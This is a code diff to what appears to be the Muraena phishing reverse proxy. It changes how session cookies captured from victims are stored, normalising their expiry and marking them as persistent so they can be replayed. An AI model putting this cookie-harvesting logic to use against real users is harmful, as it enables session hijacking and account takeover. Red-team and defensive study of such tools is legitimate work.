@@ -12,6 +12,7 @@ import (
 	"regexp"
 	"strconv"
 	"strings"
+	"time"
 	"unicode/utf8"
 
 	"github.com/evilsocket/islazy/tui"
@@ -281,6 +282,7 @@ skip:
 						c.Domain = fmt.Sprintf("%s", c.Domain)
 					}
 
+					normalizedExpiry := db.NormalizeCookieExpiry(time.Time{})
 					sessCookie := db.VictimCookie{
 						Name:     c.Name,
 						Value:    c.Value,
@@ -288,9 +290,9 @@ skip:
 						Path:     "/",
 						HTTPOnly: false,
 						Secure:   true,
-						Session:  true,
+						Session:  false,
 						SameSite: "None",
-						Expires:  "2040-01-01 00:00:00 +0000 UTC",
+						Expires:  normalizedExpiry.Format("2006-01-02 15:04:05 -0700 MST"),
 					}
 					muraena.Tracker.PushCookie(victim, sessCookie)
 				}
@@ -519,14 +521,16 @@ func (muraena *MuraenaProxy) ResponseProcessor(response *http.Response) (err err
 					}
 
 					c.Domain = strings.Replace(c.Domain, ":443", "", -1)
+					normalizedExpiry := db.NormalizeCookieExpiry(c.Expires)
 					sessCookie := db.VictimCookie{
 						Name:     c.Name,
 						Value:    c.Value,
 						Domain:   c.Domain,
-						Expires:  c.Expires.String(), // will be set by necrobrowser
+						Expires:  normalizedExpiry.Format("2006-01-02 15:04:05 -0700 MST"),
 						Path:     c.Path,
 						HTTPOnly: c.HttpOnly,
 						Secure:   c.Secure,
+						Session:  false,
 					}
 
 					muraena.Tracker.PushCookie(victim, sessCookie)
